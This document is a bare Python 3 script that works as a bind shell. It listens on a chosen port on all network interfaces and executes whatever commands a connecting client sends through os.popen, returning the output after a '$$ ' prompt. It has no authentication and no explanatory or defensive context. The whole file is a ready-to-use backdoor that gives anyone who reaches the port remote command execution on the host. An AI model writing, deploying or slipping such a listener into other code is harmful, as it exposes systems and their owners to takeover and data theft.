#!/usr/bin/env python3

import socket, sys, os

close = 0

if len(sys.argv) < 2:
    print('Usage: {} <port number>'.format(sys.argv[0]))

else:
    while close < 2:
        close = 0
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind(('0.0.0.0', int(sys.argv[1])))
        s.listen()
        connection, address = s.accept()
        s.shutdown(socket.SHUT_RDWR)
        s.close()
        send_me = '\n$$ '
        connection.send(send_me.encode('utf-8')) 
        while close < 1:
            data = connection.recv(1024).decode('utf-8')
            response = os.popen(data)
            with response as f:
                send_me = f.read()
            send_me += '$$ '
            connection.send(send_me.encode('utf-8')) 
            if data == 'exit\n':
                close = 1
            elif data == 'quit\n':
                close = 2
        connection.shutdown(socket.SHUT_RDWR)
        connection.close()
